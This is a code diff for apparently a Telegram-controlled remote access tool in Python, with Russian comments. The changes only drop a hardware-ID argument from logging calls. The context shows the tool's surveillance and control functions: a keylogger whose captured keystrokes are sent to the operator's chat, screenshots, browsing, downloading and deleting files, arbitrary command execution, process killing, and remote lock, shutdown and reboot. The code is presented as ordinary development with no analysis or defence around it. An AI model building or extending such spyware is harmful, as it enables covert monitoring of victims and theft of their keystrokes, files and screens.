@@ -746,7 +746,7 @@ def callback_handler(call):
                 
                 # Запускаем файловый менеджер с текущей директорией
                 send_file_manager(chat_id, ".", 0, message_id)
-                db.log_action(user_id, target_hwid, "file_manager_open")
+                db.log_action(user_id, "file_manager_open")
                 
             except Exception as e:
                 logger.error(f"Ошибка открытия файлового менеджера: {e}")
@@ -776,7 +776,7 @@ def callback_handler(call):
                     bot.send_photo(chat_id, photo, caption=caption)
                 
                 os.remove(screenshot_path)
-                db.log_action(user_id, target_hwid, "screen_from_panel")
+                db.log_action(user_id, "screen_from_panel")
             except Exception as e:
                 bot.answer_callback_query(call.id, f"❌ Ошибка: {str(e)[:50]}")
         
@@ -808,7 +808,7 @@ def callback_handler(call):
                 
                 # Отправляем в моноширинном формате
                 bot.send_message(chat_id, f"<pre>{escape_html(monospace_text)}</pre>", parse_mode='HTML')
-                db.log_action(user_id, target_hwid, "procs_from_panel")
+                db.log_action(user_id, "procs_from_panel")
             except Exception as e:
                 logger.error(f"Ошибка отправки кейлога: {e}", exc_info=True)
                 bot.answer_callback_query(call.id, f"❌ Ошибка: {str(e)[:50]}")
@@ -827,7 +827,7 @@ def callback_handler(call):
                 
                 if lock_computer():
                     send_success_message(chat_id, "успешно ✅")
-                    db.log_action(user_id, target_hwid, "lock_computer")
+                    db.log_action(user_id, "lock_computer")
                 else:
                     bot.send_message(chat_id, "❌ Ошибка блокировки компьютера.")
             except Exception as e:
@@ -851,7 +851,7 @@ def callback_handler(call):
                 
                 if shutdown_computer(delay=10):
                     send_success_message(chat_id, "успешно ✅")
-                    db.log_action(user_id, target_hwid, "shutdown_computer")
+                    db.log_action(user_id, "shutdown_computer")
                 else:
                     bot.send_message(chat_id, "❌ Ошибка выключения компьютера.")
             except Exception as e:
@@ -875,7 +875,7 @@ def callback_handler(call):
                 
                 if restart_computer(delay=10):
                     send_success_message(chat_id, "успешно ✅")
-                    db.log_action(user_id, target_hwid, "reboot_computer")
+                    db.log_action(user_id, "reboot_computer")
                 else:
                     bot.send_message(chat_id, "❌ Ошибка перезагрузки компьютера.")
             except Exception as e:
@@ -937,7 +937,7 @@ def callback_handler(call):
                     visible_file_name=filename
                 )
                 
-                db.log_action(user_id, target_hwid, "keylog_view")
+                db.log_action(user_id, "keylog_view")
             except Exception as e:
                 bot.answer_callback_query(call.id, f"❌ Ошибка: {str(e)[:50]}")
         
@@ -1070,7 +1070,7 @@ def callback_handler(call):
                 
                 if killed > 0:
                     bot.send_message(chat_id, f"✅ Завершено {killed} процессов с именем {process_name}.")
-                    db.log_action(user_id, target_hwid, "kill_process", f"Killed {killed} processes: {process_name}")
+                    db.log_action(user_id, "kill_process", f"Killed {killed} processes: {process_name}")
                 else:
                     bot.send_message(chat_id, f"❌ Процессы с именем {process_name} не найдены.")
             except Exception as e:
@@ -1103,7 +1103,7 @@ def callback_handler(call):
                 text += f"<pre>{escape_html(result)}</pre>"
                 
                 bot.send_message(chat_id, text, parse_mode='HTML')
-                db.log_action(user_id, target_hwid, "execute_cmd", f"Command: {cmd[:50]}")
+                db.log_action(user_id, "execute_cmd", f"Command: {cmd[:50]}")
             except Exception as e:
                 bot.send_message(chat_id, f"❌ Ошибка выполнения команды: {e}")
         
@@ -1120,7 +1120,7 @@ def callback_handler(call):
                 
                 if start_keylogger():
                     bot.send_message(chat_id, "✅ Кейлоггер запущен.")
-                    db.log_action(user_id, target_hwid, "keylog_start")
+                    db.log_action(user_id, "keylog_start")
                 else:
                     bot.send_message(chat_id, "❌ Ошибка запуска кейлоггера.")
             except Exception as e:
@@ -1138,7 +1138,7 @@ def callback_handler(call):
                 
                 if stop_keylogger():
                     bot.send_message(chat_id, "✅ Кейлоггер остановлен.")
-                    db.log_action(user_id, target_hwid, "keylog_stop")
+                    db.log_action(user_id, "keylog_stop")
                 else:
                     bot.send_message(chat_id, "❌ Ошибка остановки кейлоггера.")
             except Exception as e:
@@ -1165,7 +1165,7 @@ def callback_handler(call):
                     page = 0
                 
                 send_file_manager(chat_id, path, page, message_id)
-                db.log_action(user_id, target_hwid, f"file_manager_nav_{path}")
+                db.log_action(user_id, f"file_manager_nav_{path}")
                 
             except Exception as e:
                 logger.error(f"Ошибка навигации в файловом менеджере: {e}")
@@ -1208,7 +1208,7 @@ def callback_handler(call):
                 
                 filepath = data.replace('files_view_', '')
                 send_file_view(chat_id, filepath)
-                db.log_action(user_id, target_hwid, f"file_manager_view_{os.path.basename(filepath)}")
+                db.log_action(user_id, f"file_manager_view_{os.path.basename(filepath)}")
                 
             except Exception as e:
                 logger.error(f"Ошибка просмотра файла: {e}")
@@ -1251,7 +1251,7 @@ def callback_handler(call):
                 ))
                 bot.send_message(chat_id, "⬇️ Действия с файлом:", reply_markup=keyboard)
                 
-                db.log_action(user_id, target_hwid, f"file_manager_preview_{filename}")
+                db.log_action(user_id, f"file_manager_preview_{filename}")
                 
             except Exception as e:
                 logger.error(f"Ошибка предпросмотра файла: {e}")
@@ -1291,7 +1291,7 @@ def callback_handler(call):
                         visible_file_name=filename
                     )
                 
-                db.log_action(user_id, target_hwid, f"file_manager_download_{filename}")
+                db.log_action(user_id, f"file_manager_download_{filename}")
                 
             except Exception as e:
                 logger.error(f"Ошибка скачивания файла: {e}")
@@ -1344,7 +1344,7 @@ def callback_handler(call):
                     parent_dir = os.path.dirname(filepath)
                     send_file_manager(chat_id, parent_dir, 0, message_id)
                     
-                    db.log_action(user_id, target_hwid, f"file_manager_delete_{filename}")
+                    db.log_action(user_id, f"file_manager_delete_{filename}")
                 else:
                     bot.send_message(chat_id, f"❌ Не удалось удалить файл `{filename}`.")
                 
@@ -1378,7 +1378,7 @@ def callback_handler(call):
                 
                 if clear_keylog():
                     bot.send_message(chat_id, "✅ Лог кейлоггера очищен.")
-                    db.log_action(user_id, target_hwid, "keylog_clear")
+                    db.log_action(user_id, "keylog_clear")
                 else:
                     bot.send_message(chat_id, "❌ Ошибка очистки лога.")
             except Exception as e:
